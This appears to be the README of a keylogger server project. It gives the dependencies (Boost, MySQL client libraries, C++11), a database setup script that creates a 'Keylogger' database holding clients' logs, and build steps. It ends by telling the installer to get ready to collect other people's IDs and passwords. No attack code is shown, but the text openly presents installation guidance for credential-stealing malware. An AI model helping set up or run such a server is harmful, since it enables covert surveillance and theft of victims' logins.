REQUIREMENTS
-------------
	We recommend that users upgrade or install C++ BOOST libraries & libmysqlclient-devel libraries,
	otherwise they won't be able to install the server. Also, ensure that you have installed a g++ version
	that compiles C++11
	Also, you might need to configure your MySQL/MariaDB server so that the program may easily access it
	via root user.

INSTALLATION
------------
	If you are installing the server for the first time, launch the shell script db.sh located in scripts
	dir that way :
	    $> scripts/db.sh
	This script will start your sql server as root user and will use a .sql file that will set a new DB
	named Keylogger, which will contain all the clients logs in 6 tables.
	Once it is done, just run "make" to compile the server's binary :
	    $> make re

	If you've followed these instructions without any issue : YOU MADE IT ! You have just installed the
	keylogger's server. Get ready to collect some cripsy ids & passwords ! :D
